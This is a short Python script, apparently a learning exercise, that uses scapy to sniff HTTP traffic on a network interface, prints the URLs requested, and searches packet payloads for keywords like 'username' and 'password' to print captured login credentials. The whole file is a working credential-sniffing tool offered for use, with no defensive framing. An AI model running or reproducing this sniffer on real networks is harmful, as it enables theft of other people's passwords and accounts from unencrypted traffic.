#!/usr/bin/env python3
# @Author - Avish Dhirawat
# Date - 13/08/2020

import scapy.all as scapy
from scapy.layers import http # Third party module to filter http requests
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', dest = 'interface', help = "Interface on which you wanna run the packet sniffer")
    options = parser.parse_args()
    if not options.interface:
        parser.error("Please specify the Interface, Use -- help for more info.")
    else:
        return options

def sniff(interface):
    #scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet, filter = "port 80") # prn to run the given program whenever we get some packet.
    # Filter is used to filter the packets based on its type or port for eg :- tcp, arp, port 21, etc. Filter doesn't allow us to filter the http requests.
    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if(packet.haslayer(scapy.Raw)): # Raw layer contains password and username (we can use any other layer also to extract other info)
        #print(packet[scapy.Raw].load) # Load is a field in layer Raw
        load = packet[scapy.Raw].load
        load = str(load)
        keywords = ['username', 'email', 'login', 'Email Id', 'user id', 'Userid', 'login id', 'password', 'pass', 'Password', 'Email Address', 'Login Id', 'Password', 'UserLogin', 'User', 'Username']
        #print(load)
        for keyword in keywords:
            if keyword in load:
                return load
                #print("\n\n[+] Possible Username/Password >> " + load + "\n\n")
                #break

def process_sniffed_packet(packet):
    #print(packet)
    if(packet.haslayer(http.HTTPRequest)): # haslayer function from module scapy.layers
        #print(packet.show())
        #url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode()) # Here decode() is used to convert byte into str its another of conversion.
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible Username/Password >> " + str(login_info) + "\n\n")

options = get_arguments()
interface = options.interface
sniff(interface)
